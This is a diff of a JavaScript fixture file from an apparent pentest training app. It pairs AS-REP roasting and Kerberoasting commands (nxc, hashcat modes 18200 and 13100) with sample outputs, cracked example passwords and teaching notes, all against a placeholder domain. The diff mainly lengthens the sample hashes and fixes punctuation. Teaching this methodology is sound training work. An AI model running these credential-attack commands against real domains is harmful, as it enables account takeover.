@@ -1,22 +1,22 @@
 /*!
- * obol data — study-fixtures.js — OBOL.STUDY_FIXTURES
+ * obol data - study-fixtures.js - OBOL.STUDY_FIXTURES
  *
  * The one piece of the study cell NOT derivable from the packs: a representative sample of what each
  * move's output looks like, the one line that matters ("signal"), and a plain teach note about why.
  *
- * COHERENCE CONTRACT (enforced by tests/engine/study-smoke.js): every fixture pins `cmd` — the exact
- * command its `output` came from — and the Watch replay types THAT command above the result. `tool`
+ * COHERENCE CONTRACT (enforced by tests/engine/study-smoke.js): every fixture pins `cmd` - the exact
+ * command its `output` came from - and the Watch replay types THAT command above the result. `tool`
  * is its tool. The output is pure tool result: it never re-types a `$ command` echo, so the command
  * the learner sees and the output below it are always one real run, never a sample paired against a
  * different command. `signal` is one real line of the output (the evidence that matters).
  *
  * `situation` / `choices` / `coach` drive the "Your turn" retrieval-practice gear; they are merged in
  * from PRACTICE at the bottom. The verdict for each choice (correct / also-valid / locked) is computed
- * in study.js from the real requires — only the choice set and nuance coaching live here.
+ * in study.js from the real requires - only the choice set and nuance coaching live here.
  *
  * Commands and outputs use consistent example values: target 10.10.10.10, domain acme.internal (ACME),
  * DC01, attacker 10.10.14.5, an internal segment 172.16.5.0/24. They are invocation + sample output
- * only — the methodology, not weaponised payloads.
+ * only - the methodology, not weaponised payloads.
  */
 (function (root) {
   'use strict';
@@ -781,16 +781,16 @@
       cmd: "nxc ldap 10.10.10.10 -u users.txt -p '' --asreproast asrep.hash", tool: 'nxc',
       output: [
         'LDAP  10.10.10.10  389  DC01  [+] tgibson has UF_DONT_REQUIRE_PREAUTH set',
-        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b',
+        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7d9e1f30517293b4d5f61738597:9c2d4e6f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a8b',
       ].join('\n'),
-      signal: '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b',
+      signal: '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7d9e1f30517293b4d5f61738597:9c2d4e6f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a8b',
       teach: 'An account with pre-auth disabled (UF_DONT_REQUIRE_PREAUTH) hands out an AS-REP encrypted with its password hash to anyone who asks, no credentials needed. Capture that $krb5asrep$ hash and crack it offline.',
     },
     'crack-asrep': {
       why: "The payoff step that turns a roasted hash into an actual login, run it the moment AS-REP roasting hands you a $krb5asrep$ blob. It cracks entirely on your box with hashcat mode 18200, so there is zero further contact with the DC. These are usually accounts set to skip pre-auth and then given a weak password, so rockyou lands often; when it does not, the password is strong and you move on rather than grind. A hit is a validated domain credential, usually your first real foothold.",
       cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
-        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b:Autumn2026!',
+        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7d9e1f30517293b4d5f61738597:9c2d4e6f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a8b:Autumn2026!',
         'Status...........: Cracked',
       ].join('\n'),
       signal: 'Status...........: Cracked',
@@ -823,16 +823,16 @@
       cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --kerberoasting tgs.hash", tool: 'nxc',
       output: [
         'LDAP  10.10.10.10  389  DC01  [+] Found SPN: MSSQLSvc/db01.acme.internal (svc_sql)',
-        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...',
+        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc/db01.acme.internal*$3f2a4b5c6d7e8f90a1b2c3d4e5f60718$9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c',
       ].join('\n'),
-      signal: '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...',
+      signal: '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc/db01.acme.internal*$3f2a4b5c6d7e8f90a1b2c3d4e5f60718$9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c',
       teach: 'Any authenticated user can request a service ticket for an account that has an SPN. That ticket is encrypted with the service account\'s password hash, so you crack it offline. Service accounts often have weak, rarely-rotated passwords.',
     },
     'crack-tgs': {
       why: "The $krb5tgs$ ticket you roasted cracks offline to the service account's plaintext. Reach for it right after kerberoasting. Service accounts often carry weak, never-expiring passwords and elevated rights, so a crack here is frequently a big step up, sometimes straight to Domain Admin if the account is over-privileged. If rockyou does not break it, the password is strong, so note it and look elsewhere rather than grinding.",
       cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
-        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...:P@ssw0rd2023',
+        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc/db01.acme.internal*$3f2a4b5c6d7e8f90a1b2c3d4e5f60718$9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c:P@ssw0rd2023',
         'Status...........: Cracked',
       ].join('\n'),
       signal: 'Status...........: Cracked',
@@ -1334,7 +1334,7 @@
       why: "Service accounts are the soft target of Active Directory: their passwords are set by humans, rarely rotated, and any domain user can request a crackable ticket for them. A cracked $krb5tgs$ hash hands you that service account's plaintext, which often has elevated rights. Reach for it after roasting, run it offline, and if rockyou does not crack it the account probably has a strong password, so move on rather than grinding.",
       cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
-        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$...:3f2a...:Summer2024!',
+        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc/db01.acme.internal*$3f2a4b5c6d7e8f90a1b2c3d4e5f60718$9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a:Summer2024!',
         'Status...........: Cracked',
       ].join('\n'),
       signal: 'Status...........: Cracked',
@@ -1344,7 +1344,7 @@
       why: "This is the rare attack that asks nothing of you but a username list: one account with pre-authentication disabled hands you crackable ciphertext for free, no credentials required. The $krb5asrep$ hash it yields cracks offline to that user's plaintext, and a single pre-auth-disabled account can be your entire foothold into the domain. Reach for it the moment AS-REP roasting surfaces such a user; it is pure upside with nothing noisy on the wire.",
       cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
-        '$krb5asrep$23$jdoe@ACME.INTERNAL:a1b2...:Welcome2024!',
+        '$krb5asrep$23$jdoe@ACME.INTERNAL:a1b2c3d4e5f60718293a4b5c6d7e8f90:9c2d4e6f8091a2b3c4d5e6f708192a3b:Welcome2024!',
         'Status...........: Cracked',
       ].join('\n'),
       signal: 'Status...........: Cracked',
